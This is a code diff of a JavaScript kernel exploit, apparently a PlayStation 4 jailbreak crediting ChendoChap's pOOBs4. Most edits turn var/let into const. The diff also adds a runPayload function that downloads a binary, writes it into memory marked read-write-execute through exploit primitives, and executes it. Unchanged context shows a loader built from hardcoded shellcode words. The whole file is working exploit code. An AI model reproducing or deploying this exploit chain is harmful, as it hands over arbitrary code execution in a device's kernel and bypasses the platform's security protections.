@@ -767,7 +767,7 @@ function verify_reqs2(buf, offset) {
   // check reqs2.ar2_result.state
   // state is actually a 32-bit value but the allocated memory was
   // initialized with zeros. all padding bytes must be 0 then
-  let state = buf.read32(offset + 0x38);
+  const state = buf.read32(offset + 0x38);
   if (!(0 < state && state <= 4) || buf.read32(offset + 0x38 + 4) !== 0) {
     return false;
   }
@@ -1701,27 +1701,27 @@ export async function kexploit() {
 
 // ChendoChap's from pOOBs4
 function malloc(sz) {
-  var backing = new Uint8Array(0x10000 + sz);
+  const backing = new Uint8Array(0x10000 + sz);
   nogc.push(backing);
-  var ptr = mem.readp(mem.addrof(backing).add(0x10));
+  const ptr = mem.readp(mem.addrof(backing).add(0x10));
   ptr.backing = backing;
   return ptr;
 }
 
 // ChendoChap's from pOOBs4
 function malloc32(sz) {
-  var backing = new Uint8Array(0x10000 + sz * 4);
+  const backing = new Uint8Array(0x10000 + sz * 4);
   nogc.push(backing);
-  var ptr = mem.readp(mem.addrof(backing).add(0x10));
+  const ptr = mem.readp(mem.addrof(backing).add(0x10));
   ptr.backing = new Uint32Array(backing.buffer);
   return ptr;
 }
 
 // ChendoChap's from pOOBs4
 function runBinLoader() {
-  let payload_buffer = chain.sysp("mmap", 0x0, 0x300000, 0x7, 0x1000, 0xffffffff, 0);
-  let payload_loader = malloc32(0x1000);
-  let loader_writer = payload_loader.backing;
+  const payload_buffer = chain.sysp("mmap", 0x0, 0x300000, 0x7, 0x1000, 0xffffffff, 0);
+  const payload_loader = malloc32(0x1000);
+  const loader_writer = payload_loader.backing;
   loader_writer[0] = 0x56415741;
   loader_writer[1] = 0x83485541;
   loader_writer[2] = 0x894818ec;
@@ -1785,7 +1785,7 @@ function runBinLoader() {
   loader_writer[60] = 0xc3050fca;
 
   chain.sys("mprotect", payload_loader, 0x4000, PROT_READ | PROT_WRITE | PROT_EXEC);
-  let pthread = malloc(0x10);
+  const pthread = malloc(0x10);
 
   {
     sysi("mlock", payload_buffer, 0x300000);
@@ -1795,8 +1795,48 @@ function runBinLoader() {
   log("Awaiting payload...");
 }
 
+function runPayload(path) {
+  log(`loading ${path}`);
+  const xhr = new XMLHttpRequest();
+  xhr.open("GET", path);
+  xhr.responseType = "arraybuffer";
+  xhr.onreadystatechange = function () {
+    if (xhr.readyState === 4) {
+      if (xhr.status === 200) {
+        try {
+          const payload_buffer = chain.sysp("mmap", 0x0, 0x300000, 0x7, 0x41000, 0xffffffff, 0);
+          log(`payload buffer allocated at ${payload_buffer}`);
+
+          // Trick for 4 bytes padding
+          const padding = new Uint8Array(4 - ((xhr.response.byteLength % 4) % 4));
+          const tmp = new Uint8Array(xhr.response.byteLength + padding.byteLength);
+          tmp.set(new Uint8Array(xhr.response), 0);
+          tmp.set(padding, xhr.response.byteLength);
+
+          const shellcode = new Uint32Array(tmp.buffer);
+          for (let i = 0; i < shellcode.length; i++) {
+            mem.write32(payload_buffer.add(0x100000 + i * 4), shellcode[i]);
+          }
+          log(`loaded ${xhr.response.byteLength} bytes for payload (+ ${padding.length} bytes padding)`);
+          chain.call_void(payload_buffer);
+          sysi("munmap", payload_buffer, 0x300000);
+        } catch (e) {
+          log(`error in runPayload: ${e.message}`);
+        }
+      } else if (xhr.status >= 400 && xhr.status < 600) {
+        log(`error retrieving payload, ${xhr.status}`);
+      }
+    }
+  };
+  xhr.onerror = function () {
+    log("network error");
+  };
+  xhr.send();
+}
+
 kexploit().then((success) => {
   if (success) {
+    // runPayload("./payload.bin");
     runBinLoader();
   }
 });
